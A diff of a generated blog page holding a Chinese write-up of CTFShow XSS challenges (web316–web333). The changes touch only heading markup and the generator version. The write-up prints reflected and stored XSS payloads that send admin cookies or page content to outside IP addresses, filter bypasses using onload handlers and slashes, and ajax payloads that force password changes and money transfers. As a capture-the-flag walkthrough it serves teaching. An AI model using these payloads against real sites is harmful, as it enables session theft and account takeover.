@@ -29,7 +29,7 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 6.1.0"></head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 
@@ -504,9 +504,9 @@
 <p>今日一口气冲完 CTFShow 的 18 道 XSS 题目</p>
 <span id="more"></span>
 
-<h3 id="qian-yan"><a href="#前言" class="headerlink" title="前言"></a>前言<a href="#qian-yan" class="header-anchor">#</a></h3><p>ctfshow 的 XSS 题目全部都没源码，纯黑盒做题。</p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>ctfshow 的 XSS 题目全部都没源码，纯黑盒做题。</p>
 <p>ctfshow 的这些 XSS 题目管理员都会自动点击用户存在 XSS 漏洞的页面</p>
-<h2 id="fan-she-xing"><a href="#反射型" class="headerlink" title="反射型"></a>反射型<a href="#fan-she-xing" class="header-anchor">#</a></h2><h4 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316<a href="#web316" class="header-anchor">#</a></h4><p>本题直接将用户输入的数据回显到页面上，未做任何过滤，所以存在XSS反射型漏洞。然后管理员的cookie才有flag，生成链接后好像有机器人会去点击。</p>
+<h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><h4 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h4><p>本题直接将用户输入的数据回显到页面上，未做任何过滤，所以存在XSS反射型漏洞。然后管理员的cookie才有flag，生成链接后好像有机器人会去点击。</p>
 <p>这里我原本是想远程加载 js 的，但是好像有个跨源读取策略然后读不到 Cookie</p>
 <p><img src="/images/CTFShow-Xss/image-20230118134247021.png" alt="image-20230118134247021"></p>
 <p>所以最后只能在本地写一个 js 然后让题目的服务器执行。</p>
@@ -515,32 +515,32 @@ var img &#x3D; document.createElement(&quot;img&quot;);
 img.src &#x3D; &quot;http:&#x2F;&#x2F;47.115.222.18?Cookie&#x3D;&quot; + document.cookie;
 &lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317<a href="#web317" class="header-anchor">#</a></h4><p>这一关过滤了 script，不区分大小写。用别的标签就可以</p>
+<h4 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h4><p>这一关过滤了 script，不区分大小写。用别的标签就可以</p>
 <p>另外测试好像远程请求js不行，读不到管理员的cookie，似乎只能在页面本地执行js</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;body onload&#x3D;&quot;document.location.href&#x3D;&#39;http:&#x2F;&#x2F;47.115.222.18?cookie&#x3D;&#39;+document.cookie&quot;&gt;&lt;&#x2F;body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h4 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318<a href="#web318" class="header-anchor">#</a></h4><p>script 标签还是用不了，上一题的 payload 可以使用</p>
-<h4 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319<a href="#web319" class="header-anchor">#</a></h4><p>script、img 标签禁用，上一题的 payload 可以使用，但是换一个玩法试试。</p>
+<h4 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h4><p>script 标签还是用不了，上一题的 payload 可以使用</p>
+<h4 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h4><p>script、img 标签禁用，上一题的 payload 可以使用，但是换一个玩法试试。</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;iframe onload&#x3D;&quot;window.open(&#39;http:&#x2F;&#x2F;47.115.222.18&#x2F;&#39;+document.cookie)&quot;&gt;&lt;&#x2F;iframe&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>不过好像 window.open 不是很好，浏览器会阻止自动弹出窗口，虽然我们可以点击允许弹出，但是用 location.href 比较妥当应该。</p>
-<h4 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320<a href="#web320" class="header-anchor">#</a></h4><p>还以为过滤了很多标签，结果最后是空格被过滤了，好像只要存在空格那就清空输入。一般可以采用斜杠绕过空格</p>
+<h4 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h4><p>还以为过滤了很多标签，结果最后是空格被过滤了，好像只要存在空格那就清空输入。一般可以采用斜杠绕过空格</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;iframe&#x2F;onload&#x3D;&quot;window.location.href&#x3D;(&#39;http:&#x2F;&#x2F;47.115.222.18&#x2F;&#39;+document.cookie)&quot;&gt;&lt;&#x2F;iframe&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h4 id="web321"><a href="#web321" class="headerlink" title="web321"></a>web321<a href="#web321" class="header-anchor">#</a></h4><p>空格依旧被过滤，答案同上</p>
-<h4 id="web322"><a href="#web322" class="headerlink" title="web322"></a>web322<a href="#web322" class="header-anchor">#</a></h4><p>同上，有趣的是这一关过滤了 <code>xss</code> 字符</p>
-<h4 id="web323"><a href="#web323" class="headerlink" title="web323"></a>web323<a href="#web323" class="header-anchor">#</a></h4><p>同上，另外的 payload如下</p>
+<h4 id="web321"><a href="#web321" class="headerlink" title="web321"></a>web321</h4><p>空格依旧被过滤，答案同上</p>
+<h4 id="web322"><a href="#web322" class="headerlink" title="web322"></a>web322</h4><p>同上，有趣的是这一关过滤了 <code>xss</code> 字符</p>
+<h4 id="web323"><a href="#web323" class="headerlink" title="web323"></a>web323</h4><p>同上，另外的 payload如下</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;body&#x2F;onload&#x3D;document.location.href&#x3D;&quot;http:&#x2F;&#x2F;47.115.222.18?cookie&#x3D;&quot;+document.cookie&gt;&lt;&#x2F;body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h4 id="web324"><a href="#web324" class="headerlink" title="web324"></a>web324<a href="#web324" class="header-anchor">#</a></h4><p>同上</p>
-<h4 id="web325"><a href="#web325" class="headerlink" title="web325"></a>web325<a href="#web325" class="header-anchor">#</a></h4><p>同上</p>
-<h4 id="web326"><a href="#web326" class="headerlink" title="web326"></a>web326<a href="#web326" class="header-anchor">#</a></h4><p>同上 </p>
-<h4 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327<a href="#web327" class="header-anchor">#</a></h4><p>题目环境好像有问题</p>
-<h2 id="cun-chu-xing"><a href="#存储型" class="headerlink" title="存储型"></a>存储型<a href="#cun-chu-xing" class="header-anchor">#</a></h2><h4 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328<a href="#web328" class="header-anchor">#</a></h4><p>登录时有个用户管理功能，其中可以查看用户名和密码，故猜测用户密和密码存在存储型XSS。所以我们在注册的框里注入 XSS 代码</p>
-<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://47.115.222.18?cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="web324"><a href="#web324" class="headerlink" title="web324"></a>web324</h4><p>同上</p>
+<h4 id="web325"><a href="#web325" class="headerlink" title="web325"></a>web325</h4><p>同上</p>
+<h4 id="web326"><a href="#web326" class="headerlink" title="web326"></a>web326</h4><p>同上 </p>
+<h4 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h4><p>题目环境好像有问题</p>
+<h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><h4 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h4><p>登录时有个用户管理功能，其中可以查看用户名和密码，故猜测用户密和密码存在存储型XSS。所以我们在注册的框里注入 XSS 代码</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://47.115.222.18?cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>然后就可以接收到管理员的 cookie，之后用这个cookie访问 &#x2F;api 拿flag</p>
-<h4 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329<a href="#web329" class="header-anchor">#</a></h4><p>本题和上一题的不同之处在于当我们拿到管理员的cookie后，题目就设置让这个cookie失效了，所以上一题的代码读到的是一个失效的cookie，所以没办法从 &#x2F;api 拿到管理员的页面。那很自然的想法就是直接以管理员的身份去访问flag所在的页面，然后把这个页面的内容发送到 我们的vps上面</p>
+<h4 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h4><p>本题和上一题的不同之处在于当我们拿到管理员的cookie后，题目就设置让这个cookie失效了，所以上一题的代码读到的是一个失效的cookie，所以没办法从 &#x2F;api 拿到管理员的页面。那很自然的想法就是直接以管理员的身份去访问flag所在的页面，然后把这个页面的内容发送到 我们的vps上面</p>
 <p>flag 在用户管理处页面的 class&#x3D;layui-table-cell laytable-cell-1-0-1 的 div 标签中</p>
 <p><img src="/images/CTFShow-Xss/image-20230119132106772.png" alt="image-20230119132106772"></p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;window.open(&#39;http:&#x2F;&#x2F;47.115.222.18&#x2F;&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[1].innerHTML)&lt;&#x2F;script&gt;
@@ -553,21 +553,21 @@ document.body.append(img);
 
 
 
-<h4 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330<a href="#web330" class="header-anchor">#</a></h4><p>这题多了一个修改密码的功能，若按照之前题目的做法读到的是 <code>*****</code></p>
+<h4 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h4><p>这题多了一个修改密码的功能，若按照之前题目的做法读到的是 <code>*****</code></p>
 <p><img src="/images/CTFShow-Xss/image-20230119133230378.png" alt="image-20230119133230378"></p>
 <p>抓下改密的包</p>
 <p><img src="/images/CTFShow-Xss/webp.webp" alt="img"></p>
 <p>那么一个想法就是通过 XSS 让管理员发出这个修改密码的 GET 请求包，所以可以注册一个用户密和密码都是 XSS Payload 的用户：</p>
-<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>window.location.href='http://127.0.0.1/api/change.php?p=123';<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://127.0.0.1/api/change.php?p=123'</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>然后使用修改后的密码登录即可。需要重启环境，要不然之前的 XSS Payload留在里面会自动跳转。</p>
 <p>也可以用别的 payload</p>
-<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'http://118.31.168.198:39543/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#top > div.layui-container'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'http://118.31.168.198:39543/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#top > div.layui-container'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h4 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331<a href="#web331" class="header-anchor">#</a></h4><p>本题和上一题是一样的，但是传参方式变成 POST 了，所以要写一个 POST 的 XSS payload 出来</p>
+<h4 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h4><p>本题和上一题是一样的，但是传参方式变成 POST 了，所以要写一个 POST 的 XSS payload 出来</p>
 <p>可以使用 ajax 进行 XSS，代码如下</p>
-<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>$.ajax(&#123;url:'api/change.php',type:'post',data:&#123;p:'123'&#125;&#125;);<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">url</span><span class="token operator">:</span><span class="token string">'api/change.php'</span><span class="token punctuation">,</span><span class="token literal-property property">type</span><span class="token operator">:</span><span class="token string">'post'</span><span class="token punctuation">,</span><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token literal-property property">p</span><span class="token operator">:</span><span class="token string">'123'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
@@ -589,14 +589,14 @@ a<span class="token punctuation">.</span><span class="token function">send</span
 
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332<a href="#web332" class="header-anchor">#</a></h4><p>一个用钱买flag的题目，直接设置转账金额为负数就好了：但是这显然不是 XSS 的做法，理想的操作是让管理者触发 XSS 然后转账给我们</p>
+<h4 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h4><p>一个用钱买flag的题目，直接设置转账金额为负数就好了：但是这显然不是 XSS 的做法，理想的操作是让管理者触发 XSS 然后转账给我们</p>
 <p><img src="/images/CTFShow-Xss/image-20230119202539226.png" alt="image-20230119202539226"></p>
 <p>继续在注册的用户名处注入 XSS 代码</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;$.ajax(&#123;url:&#39;api&#x2F;amount.php&#39;,type:&#39;post&#39;,data:&#123;u:&#39;1&#39;,a:&#39;10000&#39;&#125;&#125;)&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>只能只能转10000，多了管理员不够钱会转账失败</p>
-<h4 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333<a href="#web333" class="header-anchor">#</a></h4><p>同上</p>
-<h3 id="can-kao-lian-jie"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接<a href="#can-kao-lian-jie" class="header-anchor">#</a></h3><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/51801f145573">ctfshow-XSS篇 - 简书 (jianshu.com)</a></p>
+<h4 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h4><p>同上</p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/51801f145573">ctfshow-XSS篇 - 简书 (jianshu.com)</a></p>
 
                 
             </div>
